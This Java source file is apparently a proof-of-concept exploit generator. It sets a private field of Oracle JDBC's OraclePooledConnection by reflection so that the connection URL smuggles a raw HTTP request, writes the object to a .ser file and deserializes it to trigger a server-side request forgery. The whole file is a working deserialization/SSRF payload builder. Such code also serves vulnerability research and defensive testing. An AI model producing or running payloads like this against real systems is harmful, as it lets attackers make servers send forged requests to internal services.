import java.io.*;
import java.lang.reflect.Field;
import java.sql.SQLException;
import java.util.Hashtable;
import java.util.Properties;

import oracle.jdbc.pool.OraclePooledConnection;

public class PooledConnectionSerializer {

	public static void main(String[] args) throws SQLException {
		
		Properties props = new Properties();
		String t = new String();
		
		t = "\naaaa\nGET /pewpewpew?anything=here HTTP/1.1\n"+
		"Host: localhost\nAnything: here\nConnection: close\n"+
		"\n\n"
		;
		
		String jdbc = new String("jdbc:oracle:thin:z/z@//127.0.0.1:8888/"+t+"end");
		
		props.put("connection_url", jdbc);

		Hashtable connectionProperty = new Hashtable();
		connectionProperty.put("connection_properties", props);

		FakeOracleConnetion fakeConnection = new FakeOracleConnetion();

		OraclePooledConnection opc = new OraclePooledConnection(fakeConnection);

		try {

			Class<? extends OraclePooledConnection> klass = opc.getClass();
			Field conProp = klass.getDeclaredField("connectionProperty");
			conProp.setAccessible(true);
			conProp.set(opc, connectionProperty);

		} catch (SecurityException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (NoSuchFieldException e) {
			// TODO Auto-gnerated catch block
			e.printStackTrace();
		} catch (IllegalArgumentException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (IllegalAccessException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}

		try {
			FileOutputStream fos = new FileOutputStream("/Users/changfengchi/exp/jdbcssrf/jdbc.ser");
			ObjectOutputStream oos = new ObjectOutputStream(fos);
			oos.writeObject(opc);

			oos.close();
			fos.close();

			try {
				FileInputStream fis = new FileInputStream("/Users/changfengchi/exp/jdbcssrf/jdbc.ser");
				ObjectInputStream ois= new ObjectInputStream(fis);
				ois.readObject();
				ois.close();
			}catch (Exception e){
				e.printStackTrace();
			}
			System.out.println("Complete");

		} catch (FileNotFoundException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}

	}

}
